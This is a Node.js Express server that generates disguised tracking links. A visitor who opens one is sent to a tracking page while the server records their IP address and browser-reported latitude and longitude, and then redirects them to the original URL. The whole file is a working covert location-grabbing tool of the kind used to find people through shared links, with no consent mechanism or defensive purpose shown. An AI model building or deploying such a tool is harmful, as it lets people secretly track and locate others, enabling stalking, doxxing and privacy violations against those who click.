const express = require('express');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const port = 3000;

// In-memory store for tracking data and links
const trackingLinks = {};
const trackingData = {};

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to create a tracking link
app.post('/create-link', (req, res) => {
  const { url } = req.body;
  if (!url) {
    return res.status(400).json({ error: 'URL is required' });
  }
  const id = uuidv4();
  trackingLinks[id] = url;
  res.json({ trackingUrl: `${req.protocol}://${req.get('host')}/track/${id}` });
});

// Serve tracking page
app.get('/track/:id', (req, res) => {
  const id = req.params.id;
  if (!trackingLinks[id]) {
    return res.status(404).send('Tracking link not found');
  }
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

// Receive tracking data (location and IP)
app.post('/track/:id/data', (req, res) => {
  const id = req.params.id;
  if (!trackingLinks[id]) {
    return res.status(404).json({ error: 'Tracking link not found' });
  }
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const { latitude, longitude } = req.body;
  trackingData[id] = {
    ip,
    latitude,
    longitude,
    timestamp: new Date().toISOString(),
  };
  console.log('Tracking data received:', trackingData[id]);
  res.json({ message: 'Data received' });
});

// Redirect to original URL after tracking
app.get('/redirect/:id', (req, res) => {
  const id = req.params.id;
  const url = trackingLinks[id];
  if (!url) {
    return res.status(404).send('Tracking link not found');
  }
  res.redirect(url);
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
